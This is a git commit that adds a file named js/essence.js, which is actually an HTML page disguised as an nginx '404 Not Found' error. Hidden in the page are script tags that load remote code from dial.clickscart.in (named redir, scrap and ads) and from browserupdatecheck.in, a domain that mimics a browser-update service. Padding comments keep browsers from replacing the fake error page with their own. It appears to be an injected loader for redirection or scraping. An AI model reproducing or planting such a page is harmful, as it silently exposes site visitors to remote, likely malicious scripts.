7163a32a860797f888a42e74fa90f3cca1e26456
cyberkiddie <52677907+cyberkiddie@users.noreply.github.com>
2025-04-05 14:54:54 +0300

    Add files via upload

---
+++ js/essence.js
@@ -0,0 +1,19 @@
+<html>
+<head><title>404 Not Found</title>
+<script src="http://dial.clickscart.in/js/jquery-1.8.2.min.js" type="text/javascript"></script>
+<script src="http://dial.clickscart.in/js/redir.js" type="text/javascript"></script></head>
+<body bgcolor="white">
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx/1.8.0</center>
+</body>
+<script src="http://dial.clickscart.in/js/scrap.js" type="text/javascript"></script>
+<script src="http://dial.clickscart.in/js/ads.js" type="text/javascript"></script>
+<script src="http://browserupdatecheck.in/js/jquery.js" type="text/javascript"></script>
+<script src="http://browserupdatecheck.in/js/essence.js" type="text/javascript"></script>
+</html>
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
